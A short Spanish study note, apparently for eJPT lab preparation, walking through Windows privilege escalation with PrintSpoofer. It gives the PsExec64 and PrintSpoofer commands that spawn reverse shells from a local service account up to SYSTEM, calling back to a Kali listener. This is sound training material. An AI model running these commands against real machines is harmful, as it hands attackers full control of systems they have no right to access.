- Comience un oyente en Kali. Simule la obtención de un shell de cuenta de servicio iniciando sesión en RDP como usuario administrador, iniciando un símbolo del sistema elevado (haga clic derecho -> ejecutar como administrador) y utilizando PSExec64.exe para activar el ejecutable reverse.exe que creó con los permisos de la cuenta "servicio local:  

```
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```

- Comience otro oyente en Kali.

- Ahora, en el shell inverso "servicio local" que activó, ejecute el exploit PrintSpoofer para activar un segundo shell inverso que se ejecuta con privilegios SYSTEM (actualice la dirección IP con su IP Kali en consecuencia):

```
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
```

enlace:
[[Preparacion-Ejpt]]
[[Herramientas]]
[[Token Impersonation - Rogue Potato]]
[[Generate a Reverse Shell Executable]]
